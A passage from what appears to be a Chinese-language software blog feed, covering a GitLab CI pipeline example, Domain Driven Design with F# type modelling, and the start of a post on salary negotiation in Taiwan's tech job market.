class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">stages:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">lint</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">build</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">test</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">deploy</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eslint:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">lint</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="comment"># Install ESLint in this docker container</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">eslint</span></span><br><span class="line">    <span class="comment"># Configure ESLint (will read your .eslintrc file)</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">eslint</span> <span class="string">--init</span></span><br><span class="line">    <span class="comment"># Run ESLint</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">eslint</span> <span class="string">&lt;your_js_file&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">build:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">build</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">npm</span> <span class="string">run</span> <span class="string">build</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">docker</span> <span class="string">build</span> <span class="string">-t</span> <span class="string">f2e-example</span> <span class="string">.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">test:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">test</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">npm</span> <span class="string">run</span> <span class="string">e2e</span></span><br><span class="line"></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">deploy</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">docker</span> <span class="string">run</span> <span class="string">-d</span> <span class="string">--name</span> <span class="string">f2e-example</span> <span class="string">-p</span> <span class="number">3000</span><span class="string">:3000</span> <span class="string">f2e-example</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 軟體工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 軟體工程 </tag>
            
            <tag> DevOps </tag>
            
            <tag> CI/CD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Domain Driven Design X User Story</title>
      <link href="/2022/04/30/thinking-domain-driven-design/"/>
      <url>/2022/04/30/thinking-domain-driven-design/</url>
      
        <content type="html"><![CDATA[<p>領域驅動設計 (Domain Driven Design) 是軟體程式碼的結構及語言需符合業務領域中的習慣用法，將實作對應到持續進化的模型。</p><blockquote><p>把專案的重點放在核心領域和領域邏輯</p></blockquote><p>在軟體開發上，通常會在與使用者進行訪談後，產生使用者故事和人物誌去理解和釐清核心領域以及領域邏輯。</p><p>小編在前公司曾經歷過讓行銷帶專案，行銷會認為自己為需求方，工作就是提出需求後事情就會自動完成。</p><p>工作流程: 老闆下指令 -&gt; 行銷整理 -&gt; 出圖實作 -&gt; 老闆下指令</p><p>在這樣的過程中，該怎麼協助專案進行? </p><p>常見釐清需求的方式會是透過 User Journey Map 和 User Story 來進行描述</p><h2 id="使用者旅程圖-User-Journey-Map"><a href="#使用者旅程圖-User-Journey-Map" class="headerlink" title="使用者旅程圖 (User Journey Map)"></a>使用者旅程圖 (User Journey Map)</h2><p>使用者的工作或流程通常會用使用者故事 (User Story) 來進行描述，目的是在<strong>特定的產品範圍</strong>與<strong>技術限制</strong>下去釐清相關需求。</p><p>使用者的工作、流程中的體驗大致區分為前中後三個階段:</p><ul><li>使用前的預期: 預期能夠經歷或得到什麼</li><li>使用中的體驗: 使用的過程中是否能真的解決問題</li><li>使用後的體驗: 相關的社群互動、評價等等</li></ul><h2 id="使用者故事-User-Story"><a href="#使用者故事-User-Story" class="headerlink" title="使用者故事 (User Story)"></a>使用者故事 (User Story)</h2><p>使用者故事常見有兩種描述的句型如下:</p><ul><li><code>As a</code> Actor <code>I want to</code> Action <code>So that I can</code> Outcome</li><li><code>Given</code> Actor <code>When</code> Action <code>then</code> Outcome</li></ul><p>在一句簡單的使用者故事句型中分別包含了 Actor、Action、Outcome，其中對於產品來說最重要的就是要得到使用者的 Why，確認使用者真正想要知道的是什麼。</p><ul><li>Actor: 誰 (Who) 在什麼情境 (Where or Which) 下使用這個產品</li><li>Action: 做什麼 (What)，需要實作的相關功能</li><li>Outcome: 強調的是為什麼 (Why) 想看到或得到什麼，決定產品中功能開發的優先順序</li></ul><p>以這個部落格的使用者故事當例子:</p><p><code>As a</code> 部落格經營者 <code>I want to</code> 優化文章關鍵字 <code>So that I can</code> 部落格 SEO 成效提升<br><code>Given</code> 部落格經營者 <code>When</code> 優化文章關鍵字完成時 <code>then</code> 部落格 SEO 成效提升</p><h3 id="使用者訪談"><a href="#使用者訪談" class="headerlink" title="使用者訪談"></a>使用者訪談</h3><p>訪談的重點在<strong>凸顯痛點及用戶需求</strong>，也就是找出背後的 Why，訪談的過程則會專注在</p><ul><li>定義研究範圍和問題</li><li>辨識出誰是使用者或是顧客</li><li>分析資料列出目標</li><li>建立使用者的任務流程</li></ul><p>訪談的流程</p><ol><li>開場介紹目的和問題</li><li>嘗試發現痛點:</li><li>留下後續紀錄</li></ol><p>引導方式期待會是能問到使用者背後真正的原因、動機以及真正想達成的目標，舉個闖紅燈很危險的例子來說。</p><blockquote><p>痛點: 闖紅燈危險</p></blockquote><p>上班常遲到 -&gt; 睡過頭 -&gt; 沒聽到鬧鐘 -&gt; 睡前沒設鬧鐘 -&gt; 跟可愛女孩子聊天聊到忘記設定</p><p>該問的</p><ul><li>過去經驗</li><li>完成任務需要完成哪些事</li></ul><p>不該問和假設</p><ul><li>價值判斷 ex 是來了解和認識不是來打分數的</li><li>引導性問題 ex 你討厭這個按鈕的擺放位置嗎?</li><li>想要什麼 ex 對方不一定知道自己想要什麼</li><li>假想的解決方案</li></ul><h2 id="領域驅動設計-Domain-Driven-Design"><a href="#領域驅動設計-Domain-Driven-Design" class="headerlink" title="領域驅動設計 (Domain Driven Design)"></a>領域驅動設計 (Domain Driven Design)</h2><ol><li>促進跨團隊的溝通、理解領域知識</li><li>專注在核心業務上，業務邏輯不受技術實作細節影響</li><li>模組化利於拆分合設計微服務</li></ol><p>做生意的本質是商業，在各個領域中除了技術本身外最重要的就是商業邏輯。</p><p>透過將複雜的問題解構，利用領域模型 (Domain Model)、領域詞彙 (Domain Terms)、通用語言 (Ubiquitous Language) 來設計和描述系統，進而可以更快的去了解和在各部門同步使用者的流程、商業模式、系統的運行。</p><blockquote><p>跨部門溝通的目標是建立 Shared Mental Model</p></blockquote><h3 id="領域-Domain"><a href="#領域-Domain" class="headerlink" title="領域 (Domain)"></a>領域 (Domain)</h3><p>能將遇到的商業情境面對的問題和解法切割成問題和解決方案兩種空間</p><ul><li>Problem Space 依照優先權和外包程度還可以細分成三種類型<ul><li>Core Domain: 有價值不可被取代</li><li>Supporting Subdomain: 支援性質可能還是需要實作</li><li>Generic Subdomain: 可以直接外包或購買現成方案</li></ul></li><li>Solution Space</li></ul><h3 id="領域模型-Domain-Model"><a href="#領域模型-Domain-Model" class="headerlink" title="領域模型 (Domain Model)"></a>領域模型 (Domain Model)</h3><p>定義領域模型，在商業的世界中除了實作的工程師外最重要的就是該領域的專家 (Domain Expert)。</p><p>小編過去曾在教育領域的新創服務，當時的老闆 (領域專家) 就是補教界的名師，而我們就是在領域的相討論中將系統實做出來。</p><p>接下來就會以補教業的系統為例子</p><ol><li>了解系統跨足的領域 &#x3D;&gt; 出題、考試、金流</li><li>了解使用案例 &#x3D;&gt; 學生測試積點可到咖啡廳換薯條或飲料 (考試、金流領域)、老師想建立補教系統與智慧題庫協助學生學習 (建題領域)</li><li>透過領域詞彙去定義通用詞彙和切割子領域 &#x3D;&gt; 每日測驗系統、建題系統、兌換系統 (金流領域)</li></ol><h3 id="有界限的語境-Bounded-Context"><a href="#有界限的語境-Bounded-Context" class="headerlink" title="有界限的語境 (Bounded Context)"></a>有界限的語境 (Bounded Context)</h3><p>當有人說出午餐想要吃一號餐，請問是肯德基的一號餐還是麥當勞的一號餐呢? 今天如果領域發生在麥當勞就會知道是大麥克餐。</p><p>所以將 “一號餐” 就需要框出範圍被隔離在有界限 (麥當勞或是肯德基) 的語境中，關鍵問題會是怎麼框出範圍?</p><ul><li>同領域詞彙 -&gt; 意義不同<ul><li>以使用者來說，建題系統的 “使用者” 是老師、測驗系統的 “使用者” 是學生</li></ul></li><li>同領域詞彙、意義 -&gt; 不同使用案例<ul><li>一號餐是大麥克還是炸雞餐、票根回收是電影票根還是餐影兌換票根</li></ul></li><li>外部系統</li></ul><p>參考資料: <a href="https://medium.com/%E7%A7%91%E6%8A%80%E6%96%B0%E6%83%B3/domain-driven-design-%E7%AC%AC%E4%BA%8C%E6%AD%A5-bounded-contexts-%E5%92%8C%E5%85%B6%E6%87%89%E7%94%A8-75c5780dab49">Bounded Contexts 和其應用</a></p><h3 id="通用語言-Ubiquitous-Language"><a href="#通用語言-Ubiquitous-Language" class="headerlink" title="通用語言 (Ubiquitous Language)"></a>通用語言 (Ubiquitous Language)</h3><p>當團隊有通用語言時，就不會產生溝通上的誤解，但需要注意的是要搭配 Bounded Context 才不會誤會一號餐是大麥克還是炸雞餐、票根回收是電影票根還是餐影兌換票根。</p><blockquote><p><img src="https://ithelp.ithome.com.tw/upload/images/20190922/20111997geXEaXinxi.png"><br>圖片來源: <a href="https://ithelp.ithome.com.tw/articles/10218943">https://ithelp.ithome.com.tw/articles/10218943</a></p></blockquote><h2 id="Designing-with-types"><a href="#Designing-with-types" class="headerlink" title="Designing with types"></a>Designing with types</h2><p><code>F#</code> 這個語言提供了大量定義 type，透過宣告 Type 的寫法去描述複雜的領域知識也建立了通用語言。</p><figure class="highlight f#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">HotelRoom</span> <span class="operator">=</span> RoomNumber <span class="keyword">of</span> <span class="type">int</span> <span class="operator">|</span> RoomName <span class="keyword">of</span> <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一號房跟商務房都是 HotelRoom</span></span><br><span class="line"><span class="keyword">let</span> room1 <span class="operator">=</span> RoomNumber <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> royalSuite <span class="operator">=</span> RoomName <span class="string">&quot;商務房&quot;</span></span><br></pre></td></tr></table></figure><p>參考資料</p><ol><li><a href="https://fsharpforfunandprofit.com/posts/designing-with-types-intro/">https://fsharpforfunandprofit.com/posts/designing-with-types-intro/</a></li><li><a href="https://fsharpforfunandprofit.com/ddd/">https://fsharpforfunandprofit.com/ddd/</a></li><li><a href="https://blog.scottlogic.com/2018/06/01/magical-domain-modelling-with-fsharp.html">https://blog.scottlogic.com/2018/06/01/magical-domain-modelling-with-fsharp.html</a></li></ol><h3 id="Wrapping-primitive-types"><a href="#Wrapping-primitive-types" class="headerlink" title="Wrapping primitive types"></a>Wrapping primitive types</h3><figure class="highlight f#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">EmailAddress</span> <span class="operator">=</span> EmailAddress <span class="keyword">of</span> <span class="type">string</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">EmailAddress</span> <span class="operator">=</span> &#123; EmailAddress<span class="operator">:</span> <span class="type">string</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="實際的範例"><a href="#實際的範例" class="headerlink" title="實際的範例"></a>實際的範例</h3><ol><li>將所有想到的類別都列出</li></ol><figure class="highlight f#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Contact</span> <span class="operator">=</span></span><br><span class="line">    &#123;</span><br><span class="line">    FirstName<span class="operator">:</span> <span class="type">string</span>;</span><br><span class="line">    MiddleInitial<span class="operator">:</span> <span class="type">string</span>;</span><br><span class="line">    LastName<span class="operator">:</span> <span class="type">string</span>;</span><br><span class="line">    </span><br><span class="line">    EmailAddress<span class="operator">:</span> <span class="type">string</span>;</span><br><span class="line">    <span class="comment">//true if ownership of email address is confirmed</span></span><br><span class="line">    IsEmailVerified<span class="operator">:</span> <span class="type">bool</span>;</span><br><span class="line"></span><br><span class="line">    Address1<span class="operator">:</span> <span class="type">string</span>;</span><br><span class="line">    Address2<span class="operator">:</span> <span class="type">string</span>;</span><br><span class="line">    City<span class="operator">:</span> <span class="type">string</span>;</span><br><span class="line">    State<span class="operator">:</span> <span class="type">string</span>;</span><br><span class="line">    Zip<span class="operator">:</span> <span class="type">string</span>;</span><br><span class="line">    <span class="comment">//true if validated against address service</span></span><br><span class="line">    IsAddressValid<span class="operator">:</span> <span class="type">bool</span>;</span><br><span class="line"></span><br><span class="line">    Start <span class="operator">:</span> DateTime;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>重構並依照相關類型進行分類</li></ol><figure class="highlight f#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">PersonalName</span> <span class="operator">=</span></span><br><span class="line">    &#123;</span><br><span class="line">    FirstName<span class="operator">:</span> <span class="type">string</span>;</span><br><span class="line">    MiddleInitial<span class="operator">:</span> <span class="type">string</span> <span class="type">option</span>;</span><br><span class="line">    LastName<span class="operator">:</span> <span class="type">string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">EmailAddress</span> <span class="operator">=</span> EmailAddress <span class="keyword">of</span> <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">EmailContactInfo</span> <span class="operator">=</span></span><br><span class="line">    &#123;</span><br><span class="line">    EmailAddress<span class="operator">:</span> EmailAddress;</span><br><span class="line">    IsEmailVerified<span class="operator">:</span> <span class="type">bool</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">ZipCode</span> <span class="operator">=</span> ZipCode <span class="keyword">of</span> <span class="type">string</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">StateCode</span> <span class="operator">=</span> StateCode <span class="keyword">of</span> <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">PostalAddress</span> <span class="operator">=</span></span><br><span class="line">    &#123;</span><br><span class="line">    Address1<span class="operator">:</span> <span class="type">string</span>;</span><br><span class="line">    Address2<span class="operator">:</span> <span class="type">string</span>;</span><br><span class="line">    City<span class="operator">:</span> <span class="type">string</span>;</span><br><span class="line">    State<span class="operator">:</span> StateCode;</span><br><span class="line">    Zip<span class="operator">:</span> ZipCode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">PostalContactInfo</span> <span class="operator">=</span></span><br><span class="line">    &#123;</span><br><span class="line">    Address<span class="operator">:</span> PostalAddress;</span><br><span class="line">    IsAddressValid<span class="operator">:</span> <span class="type">bool</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Contact</span> <span class="operator">=</span></span><br><span class="line">    &#123;</span><br><span class="line">    Name<span class="operator">:</span> PersonalName;</span><br><span class="line">    EmailContactInfo<span class="operator">:</span> EmailContactInfo;</span><br><span class="line">    PostalContactInfo<span class="operator">:</span> PostalContactInfo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>Contact 中的聯絡方式改為選填</li></ol><figure class="highlight f#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Contact</span> <span class="operator">=</span></span><br><span class="line">    &#123;</span><br><span class="line">    Name<span class="operator">:</span> PersonalName;</span><br><span class="line">    EmailContactInfo<span class="operator">:</span> EmailContactInfo <span class="type">option</span>;</span><br><span class="line">    PostalContactInfo<span class="operator">:</span> PostalContactInfo <span class="type">option</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>定義複合類型，簡化 Contact 中的聯絡方式寫法</li></ol><figure class="highlight f#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">ContactInfo</span> <span class="operator">=</span></span><br><span class="line">    <span class="operator">|</span> EmailOnly <span class="keyword">of</span> EmailContactInfo</span><br><span class="line">    <span class="operator">|</span> PostOnly <span class="keyword">of</span> PostalContactInfo</span><br><span class="line">    <span class="operator">|</span> EmailAndPost <span class="keyword">of</span> EmailContactInfo <span class="operator">*</span> PostalContactInfo</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Contact</span> <span class="operator">=</span></span><br><span class="line">    &#123;</span><br><span class="line">    Name<span class="operator">:</span> Name;</span><br><span class="line">    ContactInfo<span class="operator">:</span> ContactInfo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5"><li>List 的類型</li></ol><figure class="highlight f#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">ContactMethod</span> <span class="operator">=</span></span><br><span class="line">    <span class="operator">|</span> Email <span class="keyword">of</span> EmailContactInfo</span><br><span class="line">    <span class="operator">|</span> PostalAddress <span class="keyword">of</span> PostalContactInfo</span><br><span class="line">    <span class="operator">|</span> HomePhone <span class="keyword">of</span> PhoneContactInfo</span><br><span class="line">    <span class="operator">|</span> WorkPhone <span class="keyword">of</span> PhoneContactInfo</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">ContactInformation</span> <span class="operator">=</span></span><br><span class="line">    &#123;</span><br><span class="line">    ContactMethods  <span class="operator">:</span> ContactMethod <span class="type">list</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>參考資料</p><ol><li><a href="https://fsharpforfunandprofit.com/posts/designing-with-types-making-illegal-states-unrepresentable/">Making illegal states unrepresentable</a></li><li><a href="https://fsharpforfunandprofit.com/posts/designing-with-types-discovering-the-domain/">Discovering new concepts</a></li></ol><p>投影片可以跳到 45 頁</p><figure class="highlight f#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bounded Context 用 module 定義</span></span><br><span class="line"><span class="keyword">module</span> CardGame <span class="operator">=</span></span><br><span class="line">  <span class="comment">// 開始定義通用語言 (Ubiquitous Language)</span></span><br><span class="line">  <span class="keyword">type</span> <span class="title class_">Suit</span> <span class="operator">=</span> Club <span class="operator">|</span> Diamond <span class="operator">|</span> Spade <span class="operator">|</span> Heart</span><br><span class="line">  <span class="keyword">type</span> <span class="title class_">Rank</span> <span class="operator">=</span> Two <span class="operator">|</span> Three <span class="operator">|</span> Four <span class="operator">|</span> Five <span class="operator">|</span> SIx <span class="operator">|</span> Seven <span class="operator">|</span> Eight</span><br><span class="line">             <span class="operator">|</span> Nine <span class="operator">|</span> Ten <span class="operator">|</span> Jack <span class="operator">|</span> Queen <span class="operator">|</span> King <span class="operator">|</span>Ace</span><br><span class="line">  <span class="comment">// 在定義花色和數字後定義排組</span></span><br><span class="line">  <span class="keyword">type</span> <span class="title class_">Card</span> <span class="operator">=</span> Suit <span class="operator">*</span> Rank</span><br><span class="line"></span><br></pre></td></tr></table></figure><iframe src="//www.slideshare.net/slideshow/embed_code/key/A4ay4HQqJgu0Q" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/ScottWlaschin/domain-driven-design-with-the-f-type-system-functional-londoners-2014" title="Domain Driven Design with the F# type System -- F#unctional Londoners 2014" target="_blank">Domain Driven Design with the F# type System -- F#unctional Londoners 2014</a> </strong> from <strong><a href="//www.slideshare.net/ScottWlaschin" target="_blank">Scott Wlaschin</a></strong> </div>]]></content>
      
      
      <categories>
          
          <category> 軟體工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 軟體工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三種常見核薪流程開箱</title>
      <link href="/2022/02/17/career-negotiate-your-salary/"/>
      <url>/2022/02/17/career-negotiate-your-salary/</url>
      
        <content type="html"><![CDATA[<p>當<strong>大缺工時代</strong>遇上年後<strong>轉職潮</strong>，該選擇什麼時機? 該怎麼談薪水? 接下來會從求職者角度開箱三種常見核薪流程和五種常見徵才狀態。</p><p>十年前全世界的手機開發、網路業起飛，十年後台灣軟體業起薪還是輸結構性調薪後的半導體相關產業，不過網路業有能力的人工時精緻又領 Global Pay 也真的很令人羨慕。</p><p>近年來 3-5 年內調薪 100% 以上的公司或跳槽 2-3 倍年薪在跳的案例都不是沒有聽過，不過哪些公司這方面就不能透漏。</p><blockquote><p>選擇比努力重要</p></blockquote><ol><li><strong>選擇對的產業</strong>: 產業熱門會影響營收，薪資競爭力相對好<ul><li>外商 &gt; 台商、做跨國生意 &gt; 做本土生意、獨佔企業 &gt; 競爭企業</li></ul></li><li><strong>選擇對的公司</strong>: 龍頭獨佔市場容易有市場決定權，進入相對落後的公司，很可能半導體業的薪資還不如軟體業。</li><li><strong>選擇對的主管</strong>: 同公司不同部門不同主管差異較大，即使爆肝園區也很多人是高薪又正常上下班的，六點、七點還是熱門通勤時段。</li></ol><h2 id="公司徵才狀態"><a href="#公司徵才狀態" class="headerlink" title="公司徵才狀態"></a>公司徵才狀態</h2><p>公司徵才狀態也能夠幫助求職者進行選擇，可以試著從底下五種徵才狀態來觀察</p><ul><li>開缺時間: 年前開的缺、年後開的缺</li><li>缺人程度: 通常越急著需要人才的公司越會用挖角的方式，談薪水也相對容易</li><li>公司制度: 除了提供薪資條的案例外，不管是挖角或是依照規範都是相對專業的</li><li>專業程度: 除了提供薪資條的案例外，會依照能力或是學經歷核薪都是相對合理</li><li>緊急程度: 被挖角或是對方過於積極的都建議要多想想</li></ul><h3 id="開缺時間"><a href="#開缺時間" class="headerlink" title="開缺時間"></a>開缺時間</h3><p>表示離職或是擴編的時間，如果年底在徵才通常不是大好或大壞，除了年後轉職剩下常見熱門徵才時段會是畢業潮。</p><ul><li><strong>年前開缺</strong>: 比較有機會能避開地雷，畢竟差一小段時間就可以領年終，大部分人不會選擇在這個時間點換工作，但也有可能真的雷到不行</li><li><strong>年後開缺</strong>: 通常會頂替前一位離職者，如果關係沒處理好，也很可能會是快速離職留下的爛攤子</li></ul><h3 id="缺人程度"><a href="#缺人程度" class="headerlink" title="缺人程度"></a>缺人程度</h3><p>如何知道一間公司缺人的程度?</p><ul><li>觀察 104 上開的職缺數量</li><li>面試詢問徵才的原因</li><li>透過獵頭代為詢問及了解</li><li>觀察整體產業情況</li></ul><p>以去年底的情況，新聞報導聯發科徵才 5000 人、台積電 9000 人、仁寶電腦 1000 人、趨勢 500 人。</p><p>此時，只需稍微詢問一下同學新人報到狀況，就能夠對整個產業動向略知一二，透過財報也可以看出來是因為營收大增的徵才。</p><p>新創常見在收到募資後，此時需要對投資人交代需要衝刺 MAU、營收，這時也會需要更多人才。</p><h3 id="公司制度"><a href="#公司制度" class="headerlink" title="公司制度"></a>公司制度</h3><ul><li>有制度的公司: 很少談的空間，舉例來說上市櫃公司就會依照你念的學校、工作經歷來進行核薪</li><li>沒制度的公司: 分成摳門、賺錢賺爆兩種，前者人力為成本，後者就會很在意產出和撈錢效率</li></ul><h3 id="專業程度"><a href="#專業程度" class="headerlink" title="專業程度"></a>專業程度</h3><p>專業程度則可以從 HR 或是面談主管兩方面去觀察</p><ol><li>面談主管是否能夠在面試的階段透過專業的問題來評估你的能力?</li><li>HR 在談薪水的階段是否明確了解市場行情?</li></ol><h3 id="專案緊急程度"><a href="#專案緊急程度" class="headerlink" title="專案緊急程度"></a>專案緊急程度</h3><p>專案緊急程度比較容易會顯示在報到的時間，越快報到越好這種通常有點危險。</p><p>小編就聽說過朋友加入一間公司，報到一周內就要離職交接，接下來兩周要在沒設計稿的情況下，速度加入討論並把相關的活動頁生出來上線。</p><p>怎麼判斷專案是否緊急?</p><ul><li>透過內線打聽</li><li>面試時看面試官是否能夠誠實告知，小編就有遇過主管直接說沒有很急的專案跟時程，也會給你很多的發揮空間</li></ul><h2 id="常見核薪方式"><a href="#常見核薪方式" class="headerlink" title="常見核薪方式"></a>常見核薪方式</h2><p>三種談薪水的模式分別為 “<strong>公司制度</strong>“、”<strong>挖角</strong>“、”<strong>提供薪資條核薪</strong>“</p><ol><li><strong>公司制度核薪</strong>: 透過面試、學經歷決定職等，HR 跑完流程後會通知核薪結果</li><li><strong>挖角核薪</strong>: HR 開口就問開多少會願意來，通常也會在職缺上提供範圍 (所以要注意在合理範圍內)</li><li><strong>提供薪資條核薪</strong>: 請提供前公司薪資條、轉帳紀錄、扣繳憑單</li></ol><h3 id="公司制度核薪"><a href="#公司制度核薪" class="headerlink" title="公司制度核薪"></a>公司制度核薪</h3><p>面試流程分享</p><ol><li>hacker rank 前測 (1.5h)，分數要接近或達標才會邀請進行實體面試</li><li>實體面試分成性向測驗、英文測驗、小主管 + 資深同事實體面談</li><li>大主管二面，可能需要也可能不需要</li></ol><p>通常這樣有制度且員工多的公司，某種層級以下的員工都是依照制度處理，不會有太多的空間。</p><p>有名的大公司對學經歷的要求也會相對嚴格，有選擇的情況下較不容易去收所謂學店畢業生。</p><p>專案緊急程度上，可以觀察對方多急著需要你去下決定，在這樣有制度的大公司可能就比較不能期待能有超出市場範圍的薪資水平。</p><h3 id="挖角核薪"><a href="#挖角核薪" class="headerlink" title="挖角核薪"></a>挖角核薪</h3><p>面試流程分享</p><ol><li>HackerRank 前測 (1h)</li><li>前端工程師面試 (1h)</li><li>資深工程師面試 (1h)</li><li>CTO (1h)</li><li>CEO (40mins - 1h)</li></ol><p>較需要特殊領域專業，比起名詞解釋跟背誦會更在意你在 computer science 上的基礎概念與學習能力。</p><p>公司拿到募資，原則上只要你是人才就願意重視你，畢竟軟體業的產出就是比誰的工程師比較強。</p><p>通常會有急需解決的問題與挑戰<del>或需要你背的鍋</del>，有可能找人很快請人離開也很快。</p><h3 id="提供薪資條核薪"><a href="#提供薪資條核薪" class="headerlink" title="提供薪資條核薪"></a>提供薪資條核薪</h3><p>面試流程分享</p><ol><li>一題簡易測試，看是否熟悉 Github</li><li>主管介紹部門</li><li>Team Lead 跟行銷營運</li><li>HR 面談</li></ol><p>面試除了小作業以外還安排了兩次實體加一次遠端面試，面試過程中過於簡單，主管並無法從對談中得知面試者的相關程度。從最後跟 HRM 聊天過程中體感是前後矛盾與現實狀態上感受到不太誠實。</p><p>另外網路上一篇好文<a href="https://www.storm.mg/lifestyle/3988237">分析了透過薪資條核薪的三個可能</a>：</p><ol><li><strong>只看過去，不看未來</strong>: 技術職卻著重人選過去薪資，代表無法評估經驗是否可以發揮並帶給新公司影響。</li><li><strong>只看公司，不看個人</strong>: 薪資條、轉帳明細、扣繳憑單，代表制度上可能不專業，需依賴外界水準來確定價值。</li><li><strong>只看價格，不看價值</strong>: 